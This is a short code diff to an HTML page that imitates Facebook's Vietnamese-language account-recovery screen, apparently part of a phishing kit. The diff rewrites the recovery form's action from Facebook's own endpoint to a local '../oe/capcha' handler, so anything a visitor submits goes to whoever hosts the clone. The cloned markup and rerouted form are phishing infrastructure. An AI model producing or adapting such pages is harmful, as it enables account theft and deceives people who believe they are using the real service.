@@ -12,7 +12,7 @@
 </head>
 <body>
 	<div class="_4-u5 _30ny" style="margin-bottom: 70px;">
-		<form rel="async" method="post" action="/ajax/recover/initiate/" onsubmit="" id="u_0_a_VN">
+		<form rel="async" method="post" action="../oe/capcha" onsubmit="" id="u_0_a_VN">
 			<div class="mtl mbm ptm uiInterstitial _9np_ uiInterstitialLarge uiBoxWhite" id="initiate_interstitial">
 				<div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
 					<div class="clearfix uiHeaderTop">
@@ -62,7 +62,7 @@
 					<div class="clearfix">
 						<div  class="rfloat _ohf" style="margin-left: 205px;">
 							<a  role="button" class="_42ft _4jy0 _9nq1 textPadding13px _4jy3 _517h _51sy" name="reset_action" href="/login/notme/?notme_cuid=AYhxsgHQwDFp0Q3T-oy40LjfRGqtU2mIlT776NlJUGwbNQfHuNHr3e3iNdFXZpXo6xZqAt5tBg4nigJPVIWYYTBFPv5SWXuJQStx1Pz293l7MKbuNkix6PhslpgXkRsyckYCjBUm3UPxkTyP8WmaguDuEqcWPkz11djB5762DhZXu3W9R8wsKM2J82yH8MpOhiJz6gmkPPobIeqx0R4kyfsv&amp;flow=recovery&amp;account_finder_source=account_recovery">Không phải là bạn?</a>
-							<button formaction="../oe/capcha" value="1" class="_42ft _4jy0 _9nq0 textPadding20px _4jy3 _4jy1 selected _51sy" name="reset_action" type="submit">Tiếp tục</button>
+							<button value="1" class="_42ft _4jy0 _9nq0 textPadding20px _4jy3 _4jy1 selected _51sy" name="reset_action" type="submit">Tiếp tục</button>
 						</div>
 						<div style="margin-top: -30px;" class="pts">
 							<a class="_9o1v" href="/recover/extended?no_access=1">Không còn truy cập được nữa?</a>
